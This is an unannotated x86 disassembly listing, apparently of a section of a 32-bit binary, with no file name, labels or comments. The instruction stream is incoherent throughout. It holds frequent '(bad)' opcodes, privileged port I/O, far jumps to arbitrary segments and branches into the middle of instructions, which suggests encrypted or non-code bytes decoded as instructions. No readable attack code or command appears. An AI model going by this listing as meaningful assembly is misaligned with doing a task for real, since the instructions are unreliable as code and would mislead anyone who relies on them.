  40d4df:	or     ebx,0xfffffffe
  40d4e2:	xor    eax,0xaf1191e0
  40d4e7:	stc    
  40d4e8:	retf   0xed17
  40d4eb:	mov    esi,0x8642ad82
  40d4f0:	xor    al,BYTE PTR [ebx-0x2631a5e]
  40d4f6:	jbe    0x40d4e7
  40d4f8:	arpl   WORD PTR [eax],bp
  40d4fa:	pop    esp
  40d4fb:	fcomp  DWORD PTR [eax-0x71c3ee1c]
  40d501:	lock icebp 
  40d503:	js     0x40d50c
  40d505:	fisub  DWORD PTR [edi+0x6f6b4077]
  40d50b:	adc    edx,edi
  40d50d:	ins    BYTE PTR es:[edi],dx
  40d50e:	sub    edx,esi
  40d510:	mov    ch,0xa2
  40d512:	fadd   st,st(7)
  40d514:	mov    eax,DWORD PTR [edx-0xe]
  40d517:	cmp    BYTE PTR [edi-0x21],dl
  40d51a:	cli    
  40d51b:	sbb    BYTE PTR [edx-0x17],al
  40d51e:	xchg   edx,eax
  40d51f:	or     esi,DWORD PTR [ebp-0x20]
  40d522:	test   BYTE PTR [ebx-0x7a],cl
  40d525:	xchg   edi,eax
  40d526:	sub    eax,0x533a2656
  40d52b:	jno    0x40d572
  40d52d:	mov    edx,0xdb1a15bd
  40d532:	push   ecx
  40d533:	mov    WORD PTR [edi-0x21],ds
  40d536:	(bad)  
  40d537:	(bad)  
  40d538:	jp     0x40d4dc
  40d53a:	inc    edi
  40d53b:	jg     0x40d566
  40d53d:	inc    eax
  40d53e:	mov    ds:0x376910bf,al
  40d543:	add    ch,BYTE PTR [ecx+0x2c]
  40d546:	inc    edx
  40d547:	push   0x19
  40d549:	adc    al,0xdb
  40d54b:	add    al,0x60
  40d54d:	sub    esp,0x23a2a94
  40d553:	lods   eax,DWORD PTR ds:[esi]
  40d554:	jne    0x40d5a1
  40d556:	shr    BYTE PTR [esi-0x24],1
  40d559:	ss push ss
  40d55b:	dec    esi
  40d55c:	out    dx,al
  40d55d:	sub    eax,0x84023791
  40d562:	cwde   
  40d563:	and    DWORD PTR [esi],edi
  40d565:	stos   DWORD PTR es:[edi],eax
  40d566:	test   ebx,ebx
  40d568:	gs jbe 0x40d558
  40d56b:	mov    al,ds:0xd8266bd2
  40d570:	xchg   esi,eax
  40d571:	push   esp
  40d572:	ins    DWORD PTR es:[edi],dx
  40d573:	mov    edx,0x46e02af6
  40d578:	or     dh,BYTE PTR [edx+0x24b06968]
  40d57e:	daa    
  40d57f:	shl    DWORD PTR [ebp-0x41a56bc5],cl
  40d585:	aad    0x82
  40d587:	push   ds
  40d588:	cdq    
  40d589:	xchg   BYTE PTR [ecx-0x51],bh
  40d58c:	in     ax,0x7a
  40d58f:	mov    edx,0x616002c
  40d594:	js     0x40d5bb
  40d596:	inc    ebx
  40d597:	repz jl 0x40d522
  40d59a:	lods   eax,DWORD PTR ds:[esi]
  40d59b:	adc    BYTE PTR [edi],dl
  40d59d:	and    BYTE PTR [edi+0x62],dh
  40d5a0:	lock (bad) 
  40d5a2:	cmp    BYTE PTR [edi+eiz*8+0x15],ah
  40d5a6:	loop   0x40d573
  40d5a8:	inc    edi
  40d5a9:	into   
  40d5aa:	push   0xffffffe5
  40d5ac:	adc    BYTE PTR [ebx],cl
  40d5ae:	aad    0x54
  40d5b0:	nop
  40d5b1:	ret    0xad78
  40d5b4:	adc    eax,0x7c08c58f
  40d5b9:	mov    al,ds:0x37d902b9
  40d5be:	adc    BYTE PTR ds:0x14d6d543,0xbc
  40d5c5:	cmp    BYTE PTR [edx-0x49],0x9e
  40d5c9:	mov    esi,0x3dfa6bc
  40d5ce:	pop    esi
  40d5cf:	dec    eax
  40d5d0:	(bad)  
  40d5d1:	jne    0x40d5c0
  40d5d3:	mul    DWORD PTR [esi+ebp*8-0x44]
  40d5d7:	mov    ds:0x824a78e1,eax
  40d5dc:	jo     0x40d56b
  40d5de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5df:	jns    0x40d588
  40d5e1:	popf   
  40d5e2:	pop    ebx
  40d5e3:	out    0xe4,al
  40d5e5:	push   ebp
  40d5e6:	add    al,0x22
  40d5e8:	js     0x40d5ab
  40d5ea:	cmp    BYTE PTR [edi+ebp*8+0x541cdc7],dl
  40d5f1:	mov    bh,0x29
  40d5f3:	inc    esi
  40d5f4:	shl    DWORD PTR [esi],0x4b
  40d5f7:	adc    al,0xbe
  40d5f9:	cli    
  40d5fa:	cmp    esp,DWORD PTR [esi-0x34fef983]
  40d600:	data16 fiadd DWORD PTR [edi+0x5a]
  40d604:	push   edx
  40d605:	add    BYTE PTR [eax+0x66646147],0x3a
  40d60c:	arpl   WORD PTR ds:0xb6a5d30,bx
  40d612:	mov    bl,0xa5
  40d614:	inc    ebx
  40d615:	mov    eax,0x1c5a6107
  40d61a:	fwait
  40d61b:	and    WORD PTR [edi+0x5e],dx
  40d61f:	pop    eax
  40d620:	aad    0x26
  40d622:	jnp    0x40d699
  40d624:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d625:	ins    DWORD PTR es:[edi],dx
  40d626:	jmp    0x95c8:0x6b2332e2
  40d62d:	in     al,0xba
  40d62f:	push   ds
  40d630:	aad    0x6d
  40d632:	adc    al,0xa6
  40d634:	into   
  40d635:	xchg   esp,eax
  40d636:	mov    al,ds:0x1cf3184e
  40d63b:	enter  0x64c6,0x71
  40d63f:	aam    0x93
  40d641:	loop   0x40d64f
  40d643:	mov    esi,0xa1a50df
  40d648:	loopne 0x40d5f5
  40d64a:	scas   eax,DWORD PTR es:[edi]
  40d64b:	aad    0xc3
  40d64d:	pop    DWORD PTR [ebx+0x3d4bb645]
  40d653:	add    al,0xbe
  40d655:	sbb    eax,0xd7661552
  40d65a:	lds    ebp,FWORD PTR [esi-0x9]
  40d65d:	je     0x40d642
  40d65f:	ins    BYTE PTR es:[edi],dx
  40d660:	adc    cl,ch
  40d662:	enter  0xc80d,0x2f
  40d666:	dec    ecx
  40d667:	jno    0x40d5f2
  40d669:	jmp    0x40d640
  40d66b:	leave  
  40d66c:	xor    esi,DWORD PTR [ebx]
  40d66e:	mov    BYTE PTR [edx],cl
  40d670:	call   0xea5df86f
  40d675:	and    ch,al
  40d677:	iret   
  40d678:	out    0x77,eax
  40d67a:	jge    0x40d6dd
  40d67c:	or     DWORD PTR [esi-0x6589814d],edx
  40d682:	js     0x40d613
  40d684:	cld    
  40d685:	dec    edi
  40d686:	adc    BYTE PTR [edi-0x3e947659],ah
  40d68c:	xlat   BYTE PTR ds:[ebx]
  40d68d:	mov    ecx,0xd1c79c
  40d692:	xchg   ebx,eax
  40d693:	ins    BYTE PTR es:[edi],dx
  40d694:	sub    DWORD PTR ds:0x5c410313,ecx
  40d69a:	outs   dx,DWORD PTR ds:[esi]
  40d69b:	addr16 mov al,ds:0x3082
  40d69f:	and    DWORD PTR [edi+0x69],ebp
  40d6a2:	mov    BYTE PTR [ecx+0x2b36593c],ah
  40d6a8:	ja     0x40d668
  40d6aa:	inc    ecx
  40d6ab:	aad    0xa5
  40d6ad:	fist   WORD PTR [edi+0x2e2df66a]
  40d6b3:	xlat   BYTE PTR ds:[ebx]
  40d6b4:	mul    DWORD PTR [edi]
  40d6b6:	sub    eax,DWORD PTR [ebx+0x36a901e0]
  40d6bc:	and    BYTE PTR [ebx],dh
  40d6be:	fcom   QWORD PTR [esi+0x2921485e]
  40d6c4:	pop    es
  40d6c5:	sti    
  40d6c6:	test   eax,0x50d7f3ad
  40d6cb:	lods   al,BYTE PTR ds:[esi]
  40d6cc:	push   edx
  40d6cd:	inc    esi
  40d6ce:	mov    al,ds:0x470414e7
  40d6d3:	jecxz  0x40d70d
  40d6d5:	push   es
  40d6d6:	pop    eax
  40d6d7:	push   edi
  40d6d8:	scas   eax,DWORD PTR es:[edi]
  40d6d9:	fsubr  DWORD PTR [esi-0x5e]
  40d6dc:	rcr    bh,1
  40d6de:	dec    ebx
  40d6df:	les    ecx,FWORD PTR [esi]
  40d6e1:	es sahf 
  40d6e3:	ret    0x8de0
  40d6e6:	out    0x22,al
  40d6e8:	jno    0x40d6c0
  40d6ea:	mov    dl,0xf0
  40d6ec:	pop    eax
  40d6ed:	(bad)  
  40d6ef:	sbb    cl,ch
  40d6f1:	icebp  
  40d6f2:	mov    al,gs:0x5256c75d
  40d6f8:	adc    BYTE PTR [eax+0x26f7e153],dl
  40d6fe:	data16 and BYTE PTR [ecx+0x3eca1c38],al
  40d705:	inc    edi
  40d706:	outs   dx,DWORD PTR ds:[esi]
  40d707:	mov    ds:0x49069963,eax
  40d70c:	arpl   WORD PTR [ebx],ax
  40d70e:	pop    edx
  40d70f:	mov    ecx,DWORD PTR [edx+0x5e4b1fc9]
  40d715:	shl    BYTE PTR cs:[ecx],cl
  40d718:	jns    0x40d74a
  40d71a:	push   edx
  40d71b:	sbb    BYTE PTR [edi],0x1d
  40d71e:	hlt    
  40d71f:	(bad)  
  40d720:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d721:	fst    DWORD PTR [ecx+edx*2-0x141508c7]
  40d728:	shl    ah,0xa7
  40d72b:	inc    edi
  40d72c:	mov    WORD PTR [ebx],ss
  40d72e:	ins    DWORD PTR es:[edi],dx
  40d72f:	sub    DWORD PTR [edx+0x79ebc857],edx
  40d735:	mov    ch,0xa6
  40d737:	or     ah,0x45
  40d73a:	imul   esp,DWORD PTR [edx+esi*2],0x4748b95b
  40d741:	outs   dx,BYTE PTR ds:[esi]
  40d742:	jnp    0x40d6da
  40d744:	aas    
  40d745:	lock test ch,dh
  40d748:	mov    DWORD PTR [ebx+0x10269c74],ebp
  40d74e:	sub    ebx,DWORD PTR [ecx]
  40d750:	mov    edx,0x80660a21
  40d755:	pop    esi
  40d756:	adc    esi,DWORD PTR [esi+0x6f0cd1ea]
  40d75c:	add    DWORD PTR [edi+eax*4],eax
  40d75f:	test   eax,0x3365ecf9
  40d764:	pop    ds
  40d765:	sub    al,0x71
  40d767:	test   esi,edx
  40d769:	cmp    eax,0xa13f2f8d
  40d76e:	outs   dx,BYTE PTR ds:[esi]
  40d76f:	sbb    esp,0x95e5e47c
  40d775:	(bad)  
  40d776:	and    dl,BYTE PTR [ebp-0x45610707]
  40d77c:	mov    ebp,0x3ceb9b2
  40d781:	int3   
  40d782:	pop    edi
  40d783:	pop    edi
  40d784:	cmp    edi,ecx
  40d786:	fwait
  40d787:	test   al,0x23
  40d789:	out    dx,al
  40d78a:	push   edi
  40d78b:	inc    eax
  40d78c:	scas   al,BYTE PTR es:[edi]
  40d78d:	mov    eax,ds:0xa5380660
  40d792:	jg     0x40d7cd
  40d794:	stc    
  40d795:	pop    ds
  40d796:	sub    eax,0xebb97855
  40d79b:	jb     0x40d7b5
  40d79d:	jle    0x40d7b9
  40d79f:	js     0x40d789
  40d7a1:	xchg   esi,eax
  40d7a2:	mov    edx,0x305197f6
  40d7a7:	in     eax,0x9b
  40d7a9:	fs adc eax,0xfb194e04
  40d7af:	loopne 0x40d78f
  40d7b1:	out    dx,eax
  40d7b2:	xor    eax,0x23c2c8a8
  40d7b7:	jl     0x40d7fc
  40d7b9:	xchg   esi,eax
  40d7ba:	leave  
  40d7bb:	add    BYTE PTR [esi+ebx*2-0x67b30bf7],dl
  40d7c2:	jecxz  0x40d804
  40d7c4:	mov    BYTE PTR [ebx-0x1e900399],al
  40d7ca:	and    BYTE PTR [edx+0x456dfcd3],dh
  40d7d0:	sub    esi,esi
  40d7d2:	sbb    dh,BYTE PTR [ebp-0x23b7aaba]
  40d7d8:	fst    QWORD PTR ds:0x9b25d5db
  40d7de:	sbb    al,dh
  40d7e0:	dec    esp
  40d7e1:	test   BYTE PTR [ebx-0x35be4b13],0x64
  40d7e8:	jl     0x40d80a
  40d7ea:	aaa    
  40d7eb:	or     al,0x7e
  40d7ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7ee:	stos   BYTE PTR es:[edi],al
  40d7ef:	bnd jnp 0x40d828
  40d7f2:	loopne 0x40d7d8
  40d7f4:	shl    dl,cl
  40d7f6:	dec    esp
  40d7f7:	dec    ebp
  40d7f8:	popf   
  40d7f9:	popa   
  40d7fa:	inc    esi
  40d7fb:	dec    ebp
  40d7fc:	(bad)  
  40d7fe:	jl     0x40d858
  40d800:	xor    eax,DWORD PTR [edx+0x6deec9ea]
  40d806:	in     al,0x4
  40d808:	mov    ch,0x81
  40d80a:	sbb    BYTE PTR [ebx+0x798ce154],ch
  40d810:	mov    ch,0x3d
  40d812:	das    
  40d813:	fmul   DWORD PTR [esi-0x53d19317]
  40d819:	loope  0x40d889
  40d81b:	and    edi,0x6f
  40d81e:	outs   dx,DWORD PTR ds:[esi]
  40d81f:	add    eax,ecx
  40d821:	jmp    0xd4631970
  40d826:	cmp    eax,0x8f877be2
  40d82b:	repnz das 
  40d82d:	aam    0xa0
  40d82f:	dec    edx
  40d830:	(bad)
  40d833:	push   esp
  40d834:	loope  0x40d80c
  40d836:	pop    esi
  40d837:	mov    ecx,0x1c5d6b29
  40d83c:	mov    edi,0xfd8c4214
  40d841:	mov    bh,0xd6
  40d843:	pop    edx
  40d844:	data16 shl BYTE PTR [edi-0x5ff74f8a],1
  40d84b:	dec    ecx
  40d84c:	(bad)  
  40d84d:	aad    0x1a
  40d84f:	mov    esp,0x9253d574
  40d854:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d855:	sub    eax,0xd98d4170
  40d85a:	arpl   WORD PTR [esi],bx
  40d85c:	dec    ecx
  40d85d:	rol    bl,cl
  40d85f:	test   eax,0x8ad864d0
  40d864:	outs   dx,BYTE PTR ds:[esi]
  40d865:	cmp    cl,al
  40d867:	dec    ecx
  40d868:	fdiv   DWORD PTR [ebp+0x5a]
  40d86b:	out    dx,eax
  40d86c:	and    eax,DWORD PTR [edi+0x433ebdc1]
  40d872:	and    ebp,DWORD PTR [esp+ecx*1]
  40d875:	or     al,0xfc
  40d877:	or     BYTE PTR es:[esi+0x774784d3],cl
  40d87e:	mov    al,ds:0x8398b93e
  40d883:	xchg   ecx,eax
  40d884:	jp     0x40d831
  40d886:	xor    al,BYTE PTR [ecx+0x3]
  40d889:	call   0xf0c7:0x2dc37c52
  40d890:	sub    al,0x5e
  40d892:	pop    esi
  40d893:	data16 adc dl,dl
  40d896:	push   es
  40d897:	dec    ecx
  40d898:	je     0x40d8de
  40d89a:	in     al,dx
  40d89b:	adc    BYTE PTR [edx],ch
  40d89d:	xor    edx,DWORD PTR [eax-0x2fb00e35]
  40d8a3:	push   ecx
  40d8a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8a5:	dec    ebp
  40d8a6:	add    al,0xed
  40d8a8:	int    0x7f
  40d8aa:	arpl   WORD PTR [esi+0x33],sp
  40d8ad:	push   ss
  40d8ae:	sub    DWORD PTR [ebx-0x56ac740f],ebp
  40d8b4:	pop    eax
  40d8b5:	sbb    ecx,edi
  40d8b7:	es cdq 
  40d8b9:	add    DWORD PTR [edi+0x28],0xb6077d8c
  40d8c0:	icebp  
  40d8c1:	add    bl,0x77
  40d8c4:	xor    BYTE PTR [ecx+0x3d5384a4],0x15
  40d8cb:	inc    ecx
  40d8cc:	cmp    al,0x57
  40d8ce:	retf   0xd51b
  40d8d1:	lds    ecx,FWORD PTR cs:[edi-0x21a27cf7]
  40d8d8:	test   eax,0x11bdbb46
  40d8dd:	jle    0x40d899
  40d8df:	push   esi
  40d8e0:	aaa    
  40d8e1:	push   0x70
  40d8e3:	(bad)  
  40d8e4:	js     0x40d88e
  40d8e6:	sub    eax,0xd40ab1a9
  40d8eb:	and    cl,BYTE PTR [esp-0x49]
  40d8ef:	fsub   QWORD PTR cs:[esp+edx*1]
  40d8f3:	cli    
  40d8f4:	nop
  40d8f5:	sub    BYTE PTR [ecx],dh
  40d8f7:	test   eax,0x8d5063ae
  40d8fc:	cli    
  40d8fd:	scas   eax,DWORD PTR es:[edi]
  40d8fe:	pop    ebx
  40d8ff:	pop    ss
  40d900:	lods   eax,DWORD PTR ds:[esi]
  40d901:	(bad)  
  40d902:	out    dx,eax
  40d903:	rcl    DWORD PTR ds:0xff1189ae,1
  40d909:	bnd jbe 0x40d8f0
  40d90c:	adc    al,bl
  40d90e:	aaa    
  40d90f:	popf   
  40d910:	push   edx
  40d911:	test   DWORD PTR [eax-0x49ec512e],edx
  40d917:	stc    
  40d918:	add    dh,BYTE PTR [esi-0x48]
  40d91b:	jle    0x40d8a4
  40d91d:	in     al,dx
  40d91e:	mov    dh,0x7b
  40d920:	int3   
  40d921:	xchg   ebp,eax
  40d922:	adc    al,0x55
  40d924:	dec    ebx
  40d925:	(bad)  
  40d926:	shr    DWORD PTR [edi+0x75],1
  40d929:	sub    ah,BYTE PTR [eax+ecx*4+0x577b86f5]
  40d930:	in     al,0x37
  40d932:	xchg   esi,eax
  40d933:	inc    ebp
  40d934:	add    DWORD PTR [edi+0x3ab1df58],edx
  40d93a:	jle    0x40d961
  40d93c:	popa   
  40d93d:	or     eax,0x8f305ced
  40d942:	jl     0x40d9ad
  40d944:	fiadd  DWORD PTR [ecx]
  40d946:	(bad)  
  40d947:	les    edi,FWORD PTR [edi+0x51]
  40d94a:	inc    eax
  40d94b:	nop
  40d94c:	push   ecx
  40d94d:	outs   dx,DWORD PTR ds:[esi]
  40d94e:	sub    eax,0x2ba7fa0e
  40d953:	push   ecx
  40d954:	mov    ds:0x40201053,eax
  40d959:	xor    cl,bl
  40d95b:	jmp    0x6983:0x5486a4ab
  40d962:	repz das 
  40d964:	jne    0x40d8f2
  40d966:	xor    eax,DWORD PTR [ecx-0x6ef4fb82]
  40d96c:	xchg   esi,eax
  40d96d:	addr16 loopne 0x40d905
  40d970:	ss es push edx
  40d973:	push   esi
  40d974:	inc    ebx
  40d975:	xlat   BYTE PTR ds:[ebx]
  40d976:	sub    BYTE PTR [esi+eiz*4],bh
  40d979:	mov    DWORD PTR [edx+0x5b761b1e],ebx
  40d97f:	xor    DWORD PTR [ecx-0x69],ebp
  40d982:	xchg   ebx,eax
  40d983:	inc    ebp
  40d984:	in     eax,dx
  40d985:	cmp    DWORD PTR [esi+0x724084a3],ebp
  40d98b:	add    BYTE PTR ds:0x36114a9b,dl
  40d991:	lods   eax,DWORD PTR ds:[esi]
  40d992:	sub    ecx,DWORD PTR [ecx+0x10]
  40d995:	cmp    al,0x7d
  40d997:	mov    ebx,0x2b7b4cbb
  40d99c:	pop    ds
  40d99d:	mov    ah,0x6d
  40d99f:	jge    0x40d983
  40d9a1:	bound  eax,QWORD PTR [esi]
  40d9a3:	loop   0x40d9f3
  40d9a5:	mov    ebx,0xd8808c0d
  40d9aa:	xor    al,0xae
  40d9ac:	inc    ecx
  40d9ad:	jge    0x40d972
  40d9af:	xor    al,0x5c
  40d9b1:	int3   
  40d9b2:	pop    edx
  40d9b3:	imul   ebp,edi,0x73
  40d9b6:	ss repnz adc al,0xf4
  40d9ba:	int    0xc1
  40d9bc:	xchg   DWORD PTR [esi*8-0x4e3d8af1],ebp
  40d9c3:	or     cl,BYTE PTR [eax+0x65]
  40d9c6:	xchg   edi,eax
  40d9c7:	jmp    0xc51ca6c3
  40d9cc:	hlt    
  40d9cd:	jmp    0x40da05
  40d9cf:	(bad)  
  40d9d0:	jno    0x40d9a5
  40d9d2:	inc    esi
  40d9d3:	cmp    bl,dl
  40d9d5:	or     edi,DWORD PTR [ebx-0x336b89e6]
  40d9db:	arpl   WORD PTR [edx-0x21],sp
  40d9de:	stc    
  40d9df:	jecxz  0x40d9e1
  40d9e1:	mov    ebp,DWORD PTR [ebx-0x33]
  40d9e4:	fwait
  40d9e5:	in     eax,0xb2
  40d9e7:	xor    al,0x7c
  40d9e9:	out    0xa,eax
  40d9eb:	test   eax,0x176f300e
  40d9f0:	outs   dx,DWORD PTR ds:[esi]
  40d9f1:	shr    DWORD PTR [edi],1
  40d9f3:	push   edx
  40d9f4:	rcl    dh,cl
  40d9f6:	and    eax,0x6508b461
  40d9fb:	pop    eax
  40d9fc:	pop    ss
  40d9fd:	sbb    al,0x75
  40d9ff:	arpl   WORD PTR [ecx-0x12feca55],ax
  40da05:	or     DWORD PTR [esi-0x6682a2c0],ebx
  40da0b:	dec    edx
  40da0c:	xor    eax,0xf04f3b3e
  40da11:	adc    ch,BYTE PTR [edx]
  40da13:	pop    esi
  40da14:	fwait
  40da15:	add    bl,bh
  40da17:	jg     0x40da06
  40da19:	cwde   
  40da1a:	add    eax,0x4a6cf2e6
  40da1f:	xor    eax,0x74499224
  40da24:	cmp    esi,DWORD PTR [edx+eax*4+0x7ce00c8]
  40da2b:	mov    eax,0x72d4e1f0
  40da30:	cmp    DWORD PTR [ebx+0x3c51bf4c],edi
  40da36:	mov    cx,0x1c32
  40da3a:	ja     0x40d9bd
  40da3c:	jb     0x40da9c
  40da3e:	dec    edi
  40da3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da41:	idiv   DWORD PTR [esi-0x375d272c]
  40da47:	jmp    0x40dab3
  40da49:	and    dl,0x33
  40da4c:	jb     0x40da36
  40da4e:	mov    bl,dl
  40da50:	(bad)
  40da54:	pop    ecx
  40da55:	pop    eax
  40da56:	pushf  
  40da57:	ja     0x40da33
  40da59:	out    0xa8,al
  40da5b:	xchg   ebp,eax
  40da5c:	popf   
  40da5d:	gs pop es
  40da5f:	imul   ebx,DWORD PTR [ebp-0x67a06848],0x4a
  40da66:	sbb    dl,BYTE PTR [edx]
  40da68:	pop    ds
  40da69:	dec    edx
  40da6a:	mov    dh,0x70
  40da6c:	or     DWORD PTR [ebx+eax*1],eax
  40da6f:	retf   
  40da70:	xchg   esp,eax
  40da71:	adc    ecx,ebp
  40da73:	and    al,0x76
  40da75:	push   ebp
  40da76:	js     0x40da74
  40da78:	push   ss
  40da79:	adc    esp,ebp
  40da7b:	not    ebx
  40da7d:	ror    BYTE PTR [edx],1
  40da7f:	std    
  40da80:	xchg   edx,eax
  40da81:	pusha  
  40da82:	(bad)  
  40da83:	ret    
  40da84:	repz adc edi,DWORD PTR ds:0xe0fdd2dd
  40da8b:	dec    esi
  40da8c:	xor    al,0x27
  40da8e:	cld    
  40da8f:	lds    edi,FWORD PTR [ecx-0x77]
  40da92:	dec    edi
  40da93:	sub    BYTE PTR [esi],dh
  40da95:	clc    
  40da96:	pop    edx
  40da97:	jge    0x40dac4
  40da99:	xor    BYTE PTR [eax+0xc],0xbd
  40da9d:	mov    DWORD PTR [edx],eax
  40da9f:	cmp    al,0xda
  40daa1:	adc    ah,BYTE PTR [ebx-0x291bc85b]
  40daa7:	sbb    esp,DWORD PTR [edx-0x31]
  40daaa:	sub    al,0x8
  40daac:	xchg   ebx,eax
  40daad:	(bad)  
  40daae:	aam    0x63
  40dab0:	outs   dx,DWORD PTR ds:[esi]
  40dab2:	jo     0x40daad
  40dab4:	and    al,0x1e
  40dab6:	pop    eax
  40dab7:	inc    ebp
  40dab8:	push   0xffffffb8
  40daba:	scas   al,BYTE PTR es:[edi]
  40dabb:	je     0x40dafa
  40dabd:	cli    
  40dabe:	je     0x40daeb
  40dac0:	and    BYTE PTR [ecx],0x1b
  40dac3:	ret    
  40dac4:	call   DWORD PTR [ebx-0x47314a02]
  40daca:	jb     0x40db30
  40dacc:	popa   
  40dacd:	shr    BYTE PTR [ebx+0x53708795],0xe7
  40dad4:	adc    ebp,DWORD PTR [esi+0x24]
  40dad7:	repnz sub edx,DWORD PTR [edi-0x35]
  40dadb:	inc    esp
  40dadc:	sti    
  40dadd:	js     0x40da90
  40dadf:	iret   
  40dae0:	xchg   esp,eax
  40dae1:	xchg   BYTE PTR [ecx+esi*2+0x76],cl
  40dae5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dae6:	enter  0x6796,0xab
  40daea:	adc    DWORD PTR [edi-0x41],edx
  40daed:	fs hlt 
  40daef:	cmp    esp,edi
  40daf1:	inc    DWORD PTR [esi]
  40daf3:	xchg   edx,eax
  40daf4:	xchg   BYTE PTR [ebx+0x48e9d2ab],dh
  40dafa:	mov    ch,0x98
  40dafc:	retf   0x5046
  40daff:	mov    ebx,0xca9290
  40db04:	adc    DWORD PTR [ebx+0xf39c454],edi
  40db0a:	loope  0x40daba
  40db0c:	enter  0x4ad5,0x43
  40db10:	jp     0x40dae1
  40db12:	inc    esi
  40db13:	dec    ebx
  40db14:	pop    eax
  40db15:	mov    eax,ds:0xe7c6d4c6
  40db1a:	mov    cl,0x70
  40db1c:	adc    DWORD PTR [ecx+0x6db4a89b],ebp
  40db22:	xor    BYTE PTR [esi-0x5f],ah
  40db25:	xor    dl,BYTE PTR ds:0x516c68b1
  40db2b:	cmp    al,0xc9
  40db2d:	push   es
  40db2e:	retf   0x3ae2
  40db31:	fmul   QWORD PTR [ebx]
  40db33:	loop   0x40db1a
  40db35:	mov    bh,0x8f
  40db37:	jno    0x40dac5
  40db39:	test   esp,edi
  40db3b:	and    eax,0x21e66396
  40db40:	test   eax,0x6e9d6885
  40db45:	mov    ch,0x6c
  40db47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db48:	hlt    
  40db49:	cwde   
  40db4a:	popa   
  40db4b:	ds lahf 
  40db4d:	arpl   WORD PTR [edx+0x1b554093],bx
  40db53:	(bad)  
  40db54:	out    0x19,eax
  40db56:	xor    ch,dh
  40db58:	dec    edx
  40db59:	clc    
  40db5a:	scas   eax,DWORD PTR es:[edi]
  40db5b:	test   ecx,ebx
  40db5d:	into   
  40db5e:	jmp    0x5eb83332
  40db63:	xor    al,0x9e
  40db65:	out    0xa1,eax
  40db67:	loopne 0x40db98
  40db69:	stos   DWORD PTR es:[edi],eax
  40db6a:	pop    eax
  40db6b:	data16 ins BYTE PTR es:[edi],dx
  40db6d:	idiv   BYTE PTR [esi]
  40db6f:	jbe    0x40dbac
  40db71:	inc    ebx
  40db72:	retf   0x3dae
  40db75:	xlat   BYTE PTR ds:[ebx]
  40db76:	xchg   esp,esp
  40db78:	leave  
  40db79:	push   0xffffff8a
  40db7b:	icebp  
  40db7c:	outs   dx,DWORD PTR ds:[esi]
  40db7d:	maskmovq mm1,(bad)
  40db7e:	test   DWORD PTR [eax],0x9e93e398
  40db84:	stos   BYTE PTR es:[edi],al
  40db85:	mov    bh,0x4c
  40db87:	daa    
  40db88:	das    
  40db89:	mov    eax,ds:0x6a3f9d99
  40db8e:	in     al,dx
  40db8f:	ds jle 0x40dbd6
  40db92:	and    BYTE PTR [eax-0x36],bl
  40db95:	div    BYTE PTR [ecx]
  40db97:	ss xor al,0xcb
  40db9a:	fisttp QWORD PTR [esp+edi*1-0x29]
  40db9e:	and    al,0xa
  40dba0:	mov    dl,0x46
  40dba2:	nop
  40dba3:	mov    edi,0xd058e439
  40dba8:	push   edi
  40dba9:	push   ds
  40dbaa:	fld    QWORD PTR [eax-0x2c]
  40dbad:	pop    ebx
  40dbae:	arpl   WORD PTR [ebx-0x80],si
  40dbb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbb2:	mov    ds:0x496640d7,eax
  40dbb7:	xor    esp,eax
  40dbb9:	or     BYTE PTR [eax],bh
  40dbbb:	bound  ebx,QWORD PTR [esi-0x19]
  40dbbe:	hlt    
  40dbbf:	dec    ecx
  40dbc0:	sub    DWORD PTR [edx+0x799bdea9],edx
  40dbc6:	aas    
  40dbc7:	mov    es,edx
  40dbc9:	sub    ch,bl
  40dbcb:	xchg   ebp,eax
  40dbcc:	mov    dh,al
  40dbce:	jmp    0xec7df50f
  40dbd3:	mov    cl,0xfd
  40dbd5:	mov    ah,0x11
  40dbd7:	mov    BYTE PTR [ecx+0x5b528f8b],dh
  40dbdd:	cmp    al,0xc2
  40dbdf:	jmp    0x228c:0x89bf2b6d
  40dbe6:	popa   
  40dbe7:	stos   DWORD PTR es:[edi],eax
  40dbe8:	jo     0x40dbc4
  40dbea:	sti    
  40dbeb:	jge    0x40dc16
  40dbed:	scas   eax,DWORD PTR es:[edi]
  40dbee:	cmp    ebp,DWORD PTR [ebx]
  40dbf0:	stos   DWORD PTR es:[edi],eax
  40dbf1:	scas   eax,DWORD PTR es:[edi]
  40dbf2:	bound  ecx,QWORD PTR [edx+0x7c]
  40dbf5:	fwait
  40dbf6:	lods   al,BYTE PTR ds:[esi]
  40dbf7:	and    edi,edx
  40dbf9:	xchg   esp,eax
  40dbfa:	push   ss
  40dbfb:	adc    ebx,edx
  40dbfd:	mov    ebp,0x91765810
  40dc02:	push   edi
  40dc03:	sub    eax,0xdd63b3f8
  40dc08:	sahf   
  40dc09:	cmp    bh,al
  40dc0b:	jle    0x40dc22
  40dc0d:	pop    esp
  40dc0e:	gs pop edi
  40dc10:	jl     0x40dc34
  40dc12:	in     al,0x8f
  40dc14:	cmp    bl,cl
  40dc16:	mov    ecx,0xb2c7eb48
  40dc1b:	mov    esp,0x9675b97f
  40dc20:	xchg   ecx,eax
  40dc21:	cmp    al,0xc2
  40dc23:	add    eax,0x7e86dea4
  40dc28:	mov    eax,0xa055c003
  40dc2d:	mov    ds:0x8a9993b5,al
  40dc32:	test   ebp,ebx
  40dc34:	jmp    0xb15c:0x3a0b966d
  40dc3b:	or     DWORD PTR [eax-0x419d7065],ebx
  40dc41:	into   
  40dc42:	call   0x1a70:0xf4d0
  40dc48:	hlt    
  40dc49:	stos   BYTE PTR es:[edi],al
  40dc4a:	ins    DWORD PTR es:[edi],dx
  40dc4b:	or     al,bl
  40dc4d:	loope  0x40dc5e
  40dc4f:	in     al,0x27
  40dc51:	cdq    
  40dc52:	cli    
  40dc53:	setge  BYTE PTR [edx-0x7bb4af9b]
  40dc5a:	mov    ebx,0xe069e105
  40dc5f:	mov    dl,0xb4
